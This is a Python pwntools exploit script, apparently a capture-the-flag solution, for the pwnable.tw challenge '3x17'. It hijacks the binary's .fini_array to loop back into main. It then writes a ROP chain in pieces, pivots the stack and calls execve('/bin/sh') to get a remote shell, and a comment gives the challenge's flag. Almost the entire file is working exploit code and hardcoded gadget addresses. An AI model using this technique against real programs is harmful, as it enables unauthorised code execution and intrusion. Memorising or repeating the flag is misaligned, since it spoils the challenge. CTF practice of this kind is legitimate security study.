#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# Pwntools custom functions
context.terminal = ['tmux', 'split', '-h']
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndal(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)

exe = context.binary = ELF('3x17')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10105)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *0x44a309
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

if args.GDB:
    _rcvu('\n')

fini_array = 0x4b40f0
libc_csu_fini = 0x402960
main = 0x401B6D
leave_ret = 0x401C4B
binary_end = 0x4BAA80
read = 0x446E20
syscall = 0x4022b4


_sndal(':', fini_array)
_snda(':', p64(libc_csu_fini) + p64(main))
log.info('Infinite loop created')

rop = ROP(exe)
rop.call(read, [0, binary_end, 8])
rop.raw(rop.setRegisters({'rax': 0x0})[0][0])
rop.raw(0x3b)
rop.call(syscall, [binary_end, 0, 0])
log.info('Generated ROP chain:')
log.info(rop.dump())

rop = rop.chain()
rop = [rop[i:i + 8 * 2] for i in range(0, len(rop), 8 * 2)]
first_part = rop[0]
rop = rop[1:]
for i, chunk in enumerate(rop):
    _sndal(':', fini_array + 8 * 3 + i * 8 * 2)
    _snda(':', chunk)
    log.info('Written {}/{} parts of the ROP chain'.format(i, len(rop)))

_sndal(':', fini_array)
_snda(':', p64(leave_ret) + first_part)
log.info('Triggering shell...')

_sndl('/bin/sh\x00')

_sndl('uname -a')
print (_rcvu('\n'))
log.success('Got shell!')

# FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}

io.interactive()

